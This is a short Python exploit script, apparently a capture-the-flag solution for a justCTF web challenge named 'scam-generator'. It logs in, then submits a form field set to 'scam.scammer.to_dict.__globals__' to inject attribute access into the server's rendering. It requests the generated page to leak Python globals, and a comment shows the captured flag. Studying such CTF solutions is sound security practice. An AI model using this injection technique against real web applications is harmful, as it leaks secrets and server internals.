import requests
import re

sess=requests.Session()
BASE='http://scam-generator.web.jctf.pro'
sess.post(BASE+'/login', data={
	'username': 'myid',
	'password': 'a'
	})

sess.post(BASE+'/add_victim', data={
	'firstname': 'a',
	'surname': 'a',
	'full_name': 'a',
	'type': 'scam.scammer.to_dict.__globals__'
	})

data=sess.get(BASE).content
tokens=re.findall(r'<input type="checkbox" value="([^"]+)"/>', data)
print sess.get(BASE+'/gen_scam?scammer=%s&victim=%s' % (tokens[0], tokens[-1])).content
# &#39;FLAG&#39;: &#39;justCTF{XS-Search_is_s0o_fr3aKING_Aw3s0m3!!!11}&#39;